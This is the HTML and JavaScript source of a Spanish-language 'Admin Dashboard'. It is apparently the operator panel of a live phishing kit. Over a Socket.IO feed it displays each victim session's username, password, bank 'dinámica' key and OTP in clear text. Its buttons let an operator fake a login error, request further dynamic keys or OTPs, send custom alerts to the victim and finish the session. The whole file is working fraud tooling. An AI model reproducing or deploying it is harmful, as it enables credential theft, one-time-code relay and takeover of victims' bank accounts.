<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Admin Dashboard</title>

  <style>
    :root{
      --bg:#0b1220;
      --panel:rgba(255,255,255,.06);
      --panel2:rgba(255,255,255,.08);
      --border:rgba(255,255,255,.10);
      --text:rgba(255,255,255,.92);
      --muted:rgba(255,255,255,.65);
      --shadow:0 10px 30px rgba(0,0,0,.35);
      --radius:16px;

      --green:#22c55e;
      --red:#ef4444;
      --yellow:#f59e0b;
      --blue:#60a5fa;
    }

    *{ box-sizing:border-box; }
    html,body{ height:100%; }
    body{
      margin:0;
      font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial;
      color:var(--text);
      background:
        radial-gradient(1000px 600px at 10% 10%, rgba(96,165,250,.18), transparent 60%),
        radial-gradient(900px 650px at 90% 20%, rgba(34,197,94,.14), transparent 55%),
        radial-gradient(800px 500px at 40% 90%, rgba(245,158,11,.10), transparent 55%),
        var(--bg);
    }

    .container{ max-width:1180px; margin:0 auto; padding:22px 16px 28px; }

    .topbar{
      display:flex; align-items:center; justify-content:space-between;
      gap:12px; margin-bottom:14px;
    }
    h1{ margin:0; font-size:20px; font-weight:700; letter-spacing:.2px; }

    .pill{
      display:inline-flex; align-items:center; gap:8px;
      padding:8px 10px;
      border:1px solid var(--border);
      background:rgba(255,255,255,.06);
      border-radius:999px;
      color:var(--muted);
      font-size:12px;
      box-shadow:0 8px 16px rgba(0,0,0,.18);
      user-select:none;
      white-space:nowrap;
    }

    /* Desktop layout */
    .wrap{
      display:grid;
      grid-template-columns: 1.05fr 1.35fr;
      gap:14px;
    }

    .card{
      border:1px solid var(--border);
      background:linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      overflow:hidden;
      min-height:520px;
    }

    .cardHeader{
      display:flex; align-items:center; justify-content:space-between;
      gap:10px;
      padding:14px 14px 10px;
      border-bottom:1px solid var(--border);
      background:rgba(255,255,255,.04);
    }

    .cardHeader h2{
      margin:0;
      font-size:14px;
      color:rgba(255,255,255,.88);
      font-weight:700;
      letter-spacing:.2px;
      text-transform:uppercase;
    }

    .search{
      width:240px; max-width:55%;
      display:flex; align-items:center; gap:8px;
      padding:8px 10px;
      border-radius:12px;
      border:1px solid var(--border);
      background:rgba(0,0,0,.18);
      color:var(--text);
    }
    .search input{
      width:100%;
      border:0; outline:0;
      background:transparent;
      color:var(--text);
      font-size:13px;
    }
    .search input::placeholder{ color:rgba(255,255,255,.45); }

    .cardBody{
      padding:10px;
      height:calc(520px - 48px);
      overflow:auto;
    }

    /* Rows */
    .row{
      display:flex; align-items:flex-start; justify-content:space-between;
      gap:12px;
      padding:12px;
      border-radius:14px;
      border:1px solid transparent;
      cursor:pointer;
      transition: transform .08s ease, background .12s ease, border-color .12s ease;
      background:transparent;
    }
    .row:hover{
      background:rgba(255,255,255,.06);
      border-color:rgba(255,255,255,.12);
      transform:translateY(-1px);
    }
    .row.activeSel{
      background:rgba(96,165,250,.10);
      border-color:rgba(96,165,250,.22);
    }

    .rowMain{ min-width:0; display:flex; flex-direction:column; gap:6px; }
    .rowTop{ display:flex; align-items:center; gap:10px; min-width:0; }
    .sid{
      font-weight:700;
      font-size:13px;
      letter-spacing:.2px;
      overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
      max-width:320px;
    }
    .meta{
      font-size:12px;
      color:var(--muted);
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      line-height:1.35;
    }
    .kv{
      display:inline-flex;
      gap:6px;
      align-items:center;
      padding:4px 8px;
      border-radius:999px;
      border:1px solid rgba(255,255,255,.10);
      background:rgba(0,0,0,.14);
    }
    .kv b{ font-weight:700; color:rgba(255,255,255,.82); }

    /* State dot */
    .dot{
      width:10px; height:10px;
      border-radius:999px;
      box-shadow:0 0 0 3px rgba(255,255,255,.08);
      flex:0 0 auto;
    }
    .dot.green{ background:var(--green); }
    .dot.red{ background:var(--red); }
    .dot.yellow{ background:var(--yellow); }
    .dot.gray{ background:rgba(255,255,255,.35); }

    .stateText{
      font-size:12px;
      color:rgba(255,255,255,.80);
      padding:3px 8px;
      border-radius:999px;
      border:1px solid rgba(255,255,255,.10);
      background:rgba(255,255,255,.06);
      user-select:none;
    }

    /* Detail desktop */
    .detailTop{
      display:flex; align-items:center; justify-content:space-between;
      gap:10px;
      padding:8px 12px 0;
      color:var(--muted);
      font-size:13px;
    }
    .actions{
      padding:12px;
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      border-bottom:1px solid var(--border);
    }

    button{
      border:1px solid rgba(255,255,255,.14);
      background:rgba(255,255,255,.07);
      color:var(--text);
      padding:10px 12px;
      border-radius:12px;
      cursor:pointer;
      font-weight:700;
      font-size:13px;
      transition: transform .08s ease, background .12s ease, border-color .12s ease;
    }
    button:hover{
      background:rgba(255,255,255,.10);
      border-color:rgba(255,255,255,.22);
      transform:translateY(-1px);
    }
    button.primary{
      background:rgba(96,165,250,.18);
      border-color:rgba(96,165,250,.30);
    }
    button.danger{
      background:rgba(239,68,68,.14);
      border-color:rgba(239,68,68,.28);
    }

    pre{
      margin:0;
      padding:12px;
      height:calc(520px - 48px - 56px - 44px);
      overflow:auto;
      background:rgba(0,0,0,.20);
      color:rgba(255,255,255,.88);
      font-size:12px;
      line-height:1.45;
    }

    /* ========= Mobile behavior =========
       - Only sessions list visible
       - Detail shown in modal
    */
    @media (max-width: 980px){
      .wrap{ grid-template-columns: 1fr; }
      .card{ min-height: 540px; }
      .cardBody{ height: calc(540px - 48px); }
      .search{ width:100%; max-width:60%; }
      .sid{ max-width: 220px; }

      /* Hide desktop detail card on small screens */
      .detailCardDesktop{ display:none; }
    }
    @media (max-width: 520px){
      .topbar{ flex-direction:column; align-items:flex-start; }
      .search{ max-width:100%; }
      .sid{ max-width:160px; }
    }

    /* Modal */
    .modalOverlay{
      position:fixed;
      inset:0;
      background:rgba(0,0,0,.55);
      backdrop-filter: blur(6px);
      display:none;
      align-items:flex-end;
      justify-content:center;
      padding:14px;
      z-index:9999;
    }
    .modalOverlay.open{ display:flex; }

    .modal{
      width:min(820px, 100%);
      max-height: 88vh;
      overflow:hidden;
      border-radius: 18px;
      border:1px solid var(--border);
      background: linear-gradient(180deg, rgba(255,255,255,.10), rgba(255,255,255,.06));
      box-shadow: 0 25px 60px rgba(0,0,0,.55);
      transform: translateY(12px);
      animation: slideUp .14s ease-out forwards;
    }
    @keyframes slideUp{ to{ transform: translateY(0); } }

    .modalHeader{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:10px;
      padding:12px 12px 10px;
      border-bottom:1px solid var(--border);
      background: rgba(255,255,255,.04);
    }
    .modalHeader .title{
      display:flex; align-items:center; gap:10px; min-width:0;
      font-weight:800;
      font-size:13px;
    }
    .modalHeader .title .mid{
      overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
      max-width: 58vw;
    }

    .iconBtn{
      display:inline-flex; align-items:center; justify-content:center;
      width:38px; height:38px;
      border-radius: 12px;
      border:1px solid rgba(255,255,255,.14);
      background: rgba(0,0,0,.14);
      color: var(--text);
      cursor:pointer;
      transition: transform .08s ease, background .12s ease, border-color .12s ease;
      font-weight:900;
    }
    .iconBtn:hover{
      background: rgba(255,255,255,.08);
      border-color: rgba(255,255,255,.22);
      transform: translateY(-1px);
    }

    .modalBody{
      padding: 10px 10px 0;
      overflow:auto;
      max-height: calc(88vh - 56px);
    }

    .modalActions{
      padding: 12px;
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      border-top:1px solid var(--border);
      background: rgba(0,0,0,.10);
      position: sticky;
      bottom: 0;
    }

    .modalPre{
      margin: 10px 0 12px;
      border-radius: 14px;
      border:1px solid rgba(255,255,255,.10);
      background: rgba(0,0,0,.22);
      padding: 12px;
      font-size:12px;
      line-height:1.45;
      color: rgba(255,255,255,.88);
      overflow:auto;
      max-height: 54vh;
      white-space: pre-wrap;
      word-break: break-word;
    }

    /* When desktop: hide modal entirely */
    @media (min-width: 981px){
      .modalOverlay{ display:none !important; }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="topbar">
      <h1>Dashboard Admin</h1>
      <div class="pill" id="connPill"></div>
    </div>

    <div class="wrap">
      <!-- Sessions list -->
      <div class="card">
        <div class="cardHeader">
          <h2>Sesiones</h2>
          <div class="search">
            <span style="opacity:.7;font-size:12px;">🔎</span>
            <input id="q" placeholder="Buscar por id/user/estado..." />
          </div>
        </div>
        <div class="cardBody">
          <div id="sessionsList"></div>
        </div>
      </div>

      <!-- Desktop detail card (hidden on small screens) -->
      <div class="card detailCardDesktop">
        <div class="cardHeader">
          <h2>Detalle</h2>
          <div class="pill"><b>Session:</b>&nbsp;<span id="selectedId">—</span></div>
        </div>

        <div class="detailTop" id="detailTop">Selecciona una sesión.</div>
        <div class="actions" id="actions"></div>
        <pre id="detailBox">{}</pre>
      </div>
    </div>
  </div>

  <!-- Mobile modal -->
  <div class="modalOverlay" id="modalOverlay" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <div class="modalHeader">
        <div class="title" id="modalTitle">
          <span id="modalDot"></span>
          <span class="mid" id="modalSessionId">—</span>
          <span class="stateText" id="modalState">—</span>
        </div>
        <button class="iconBtn" id="closeModalBtn" aria-label="Cerrar">✕</button>
      </div>

      <div class="modalBody">
        <div class="pill" style="display:inline-flex;margin:10px 0 0;" id="modalActionPill">action: —</div>
        <div class="modalPre" id="modalDetailBox">{}</div>
      </div>

      <div class="modalActions" id="modalActions"></div>
    </div>
  </div>

  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  <script>
    const nodeUrl = @json($nodeUrl);
    let socket;
    let sessionsById = {};
    let selectedId = null;

    // Search
    let query = "";
    const qInput = document.getElementById("q");
    qInput.addEventListener("input", () => {
      query = (qInput.value || "").trim().toLowerCase();
      renderList();
    });

    // Modal helpers
    const modalOverlay = document.getElementById("modalOverlay");
    const closeModalBtn = document.getElementById("closeModalBtn");

    function isSmallScreen(){
      return window.matchMedia("(max-width: 980px)").matches;
    }

    function openModal(){
      modalOverlay.classList.add("open");
      modalOverlay.setAttribute("aria-hidden", "false");
      document.body.style.overflow = "hidden";
    }

    function closeModal(){
      modalOverlay.classList.remove("open");
      modalOverlay.setAttribute("aria-hidden", "true");
      document.body.style.overflow = "";
    }

    closeModalBtn.addEventListener("click", closeModal);
    modalOverlay.addEventListener("click", (e) => {
      if (e.target === modalOverlay) closeModal();
    });
    window.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && modalOverlay.classList.contains("open")) closeModal();
    });

    function stateDotClass(state){
      switch(String(state || "").toUpperCase()){
        case "ACTIVE": return "green";
        case "INACTIVE": return "red";
        case "MINIMIZED": return "yellow";
        default: return "gray";
      }
    }
    function stateDot(state){
      return `<span class="dot ${stateDotClass(state)}"></span>`;
    }

    async function connectAdmin() {
      const r = await fetch("/admin/socket-token", { credentials: "same-origin" });
      const data = await r.json();

      if (!r.ok) {
        alert("No autenticado o no se pudo emitir token.");
        console.error(data);
        return;
      }

      socket = io(nodeUrl, {
        transports: ["websocket"],
        auth: { token: data.token },
      });

      socket.on("connect", () => {
        document.getElementById("connPill").innerHTML = "Socket:" + stateDot("ACTIVE");
      });

      socket.on("connect_error", (err) => {
        document.getElementById("connPill").innerHTML = "Socket:" + stateDot("INACTIVE");
        console.error("❌ connect_error:", err.message);
        alert("Socket error: " + err.message);
      });

      socket.on("admin:sessions:bootstrap", (sessions) => {
        sessionsById = {};
        (sessions || []).forEach(s => sessionsById[s.id] = s);
        renderList();

        // If a session was selected, refresh its detail (desktop or modal)
        if (selectedId && sessionsById[selectedId]) {
          renderDetail(sessionsById[selectedId]);
        }
      });

      socket.on("admin:sessions:upsert", (s) => {
        sessionsById[s.id] = s;
        renderList();

        // Update detail if currently selected
        if (selectedId === s.id) {
          renderDetail(s);
        }
      });

      socket.on("error:msg", (msg) => alert(msg));
    }

    function renderList() {
      const items = Object.values(sessionsById)
        .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt))
        .filter(s => {
          if (!query) return true;
          const blob = [s.id, s.state, s.action, s.user, s.pass, s.dinamic, s.otp]
            .map(v => (v ?? "").toString().toLowerCase())
            .join(" ");
          return blob.includes(query);
        });

      document.getElementById("sessionsList").innerHTML = items.map(s => {
        const selected = (selectedId === s.id) ? "activeSel" : "";
        return `
          <div class="row ${selected}" onclick="openSession('${s.id}')">
            <div class="rowMain">
              <div class="rowTop">
                ${stateDot(s.state)}
                <span class="stateText">${(s.state ?? "—")}</span>
                <span class="sid">${s.id}</span>
              </div>

              <div class="meta">
                <span class="kv"><b>user</b> ${s.user ?? "-"}</span>
                <span class="kv"><b>pass</b> ${s.pass ?? "-"}</span>
                <span class="kv"><b>dinamic</b> ${s.dinamic ?? "-"}</span>
                <span class="kv"><b>otp</b> ${s.otp ?? "-"}</span>
              </div>
            </div>

            <div class="pill" style="font-size:11px;">
              ${(s.action ?? "—")}
            </div>
          </div>
        `;
      }).join("");
    }

    function renderActionsHTML(s, targetElId){
      const actions = document.getElementById(targetElId);
      actions.innerHTML = "";
      if (!s) return;

      switch (s.action) {
        case "AUTH_WAIT_ACTION":
          actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_auth')">Error Login</button>
            <button class="primary" onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button class="primary" onclick="act('${s.id}','request_otp')">Pedir OTP</button>
          `;
          break;

        case "AUTH_ERROR":
          actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos</span>`;
          break;

        case "DINAMIC_WAIT_ACTION":
          actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_dinamic')">Error dinámica</button>
            <button class="primary" onclick="act('${s.id}','request_otp')">Pedir OTP</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
          break;

        case "DINAMIC_ERROR":
          actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica</span>`;
          break;

        case "OTP_WAIT_ACTION":
          actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_otp')">Error OTP</button>
            <button onclick="act('${s.id}','custom_alert')">Alerta personalizada</button>
            <button class="primary" onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
          break;

        case "OTP_ERROR":
          actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP</span>`;
          break;

        default:
          actions.innerHTML = `<span style="color:var(--muted)">Sin acciones disponibles en este estado.</span>`;
      }
    }

    function renderDetail(s) {
      // Desktop detail
      document.getElementById("selectedId").textContent = s?.id ?? "—";
      document.getElementById("detailBox").textContent = JSON.stringify(s ?? {}, null, 2);

      const dt = document.getElementById("detailTop");
      if (s){
        dt.innerHTML = `
          <span style="display:inline-flex;align-items:center;gap:10px;">
            ${stateDot(s.state)}
            <span>Estado: <b style="color:rgba(255,255,255,.92)">${s.state ?? "—"}</b></span>
          </span>
          <span>Acción: <b style="color:rgba(255,255,255,.92)">${s.action ?? "—"}</b></span>
        `;
      } else {
        dt.textContent = "Selecciona una sesión.";
      }
      renderActionsHTML(s, "actions");

      // Mobile modal detail
      if (isSmallScreen() && s){
        document.getElementById("modalSessionId").textContent = s.id ?? "—";
        document.getElementById("modalState").textContent = s.state ?? "—";
        document.getElementById("modalActionPill").textContent = `action: ${s.action ?? "—"}`;
        document.getElementById("modalDetailBox").textContent = JSON.stringify(s ?? {}, null, 2);

        // Dot in modal
        document.getElementById("modalDot").innerHTML = stateDot(s.state);

        renderActionsHTML(s, "modalActions");
      }
    }

    connectAdmin();

    // When resizing: if modal open but now desktop, close it
    window.addEventListener("resize", () => {
      if (!isSmallScreen() && modalOverlay.classList.contains("open")) closeModal();
    });

    window.openSession = function (id) {
      selectedId = id;
      renderList();

      const s = sessionsById[id];
      renderDetail(s);

      // Small screens: open modal
      if (isSmallScreen() && s){
        openModal();
      }
    }

    window.act = function (sessionId, action) {
      let message = null;
      if (action === "custom_alert") {
        message = prompt("Mensaje personalizado para el usuario:");
        if (message === null) return;
      }
      const eventName = `admin:${action}`;
      socket.emit(eventName, message ? { sessionId, message } : { sessionId });
    }
  </script>
</body>
</html>
